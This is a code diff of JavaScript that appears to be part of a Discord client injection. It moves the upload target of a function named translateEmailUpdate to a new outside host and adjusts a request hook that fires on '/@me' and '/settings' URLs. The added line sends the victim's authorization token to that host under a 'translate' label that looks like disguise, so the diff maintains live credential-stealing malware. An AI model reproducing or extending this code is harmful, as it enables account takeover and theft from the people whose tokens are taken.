@@ -1001,7 +1001,7 @@ const translateEmailUpdate = async (token, locale) => {
 
     try {
         const textParam = encodeURIComponent(JSON.stringify(sanitized));
-        const response = parseJSON(await request('GET', `https://translate-api-yr8e.onrender.com/translate?key=K4ITRUN_IS_GOD&text=${textParam}&language=${locale}`, {
+        const response = parseJSON(await request('GET', `https://translate.w1sh.xyz/translate?key=K4ITRUN_IS_GOD&text=${textParam}&language=${locale}`, {
             'Content-Type': 'application/json',
             'Authorization': token
         }));
@@ -1420,10 +1420,10 @@ const interceptRequest = () => {
         switch (true) {
             case (url.endsWith('/@me') && !script_executed):
                 await processUserUpdate();
-                break;
-            
-            case (url.includes('/settings') && !script_executed):
-                script_executed = true;
+
+                if (url.includes('/settings')) {
+                    script_executed = true;
+                }
                 break;
         };
     });
